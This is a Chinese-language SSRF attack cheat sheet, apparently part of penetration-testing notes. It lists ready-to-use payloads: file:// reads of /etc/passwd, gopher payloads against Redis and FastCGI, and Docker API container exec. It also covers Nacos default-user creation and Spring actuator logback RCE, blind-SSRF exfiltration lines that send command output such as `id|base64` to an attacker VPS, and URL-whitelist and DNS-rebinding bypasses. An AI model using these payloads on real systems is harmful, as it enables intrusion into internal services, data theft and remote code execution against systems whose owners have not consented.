【0x03 协议利用】
 file://  读文件: file:///etc/passwd  file:///C:/Windows/win.ini
 dict://  dict://127.0.0.1:6379/INFO
 gopher:// 打内网 TCP（Redis/MySQL/FastCGI）:
    gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
    用 Gopherus 生成:  python3 gopherus.py --exploit redis
 dict://127.0.0.1:6379/info
 tftp:// ldap:// jar:// netdoc:/// (Java)
 PHP:  expect://  curl 支持的全协议
 Java: netdoc:///etc/passwd 、jar:netdoc://
 SSRF 打 Redis(无认证) 写 SSH key / crontab / webshell / 主从 RCE
 SSRF 打 FastCGI(9000): gopher 构造 FCGI 任意代码执行（fcgi_exp）
 SSRF 打 Docker API(2375): /containers/json、/exec 起容器挂载根目录
 SSRF 打 Consul(8500)/Nacos(8848)/SpringBoot actuator
    /nacos/v1/auth/users?username=x&password=x  (默认添加用户)
    /actuator/env 改 logging.config 指向恶意 logback XML -> RCE

【0x04 盲 SSRF（无回显）】
 1) 外带通道: 自建监听 nc -lvnp 80；
    http://你的VPS/?x=`id|base64` 、DNSLog: http://xxx.dnslog.cn/
    参数里放命令结果外带: 访问 http://127.0.0.1 后再请求 http://attacker/<title>
 2) 布尔判断: 端口开放与否响应时间/状态/长度不同，写脚本二分爆破
 3) 时间: http://127.0.0.1:port 对开放/关闭端口的超时差异
 4) 内容外带: gopher 拿数据后 -> curl http://attacher/?d=$(...)

【0x06 防护绕过补充】
 URL 白名单包含目标域名: http://target.com@127.0.0.1、http://127.0.0.1/target.com
 结尾校验: http://127.0.0.1/?target.com、http://127.0.0.1#target.com
 二次解析: http://127.0.0.1%2523@target.com、http://127.0.0.1%0d%0aHost:target
 DNS rebinding（rebind.it / rbndr.us）：首次解析外网过校验，二次解析 127.0.0.1
 限制只能 http(s): 用 302 跳转转 gopher/file；或找开放 http 服务的内网组件
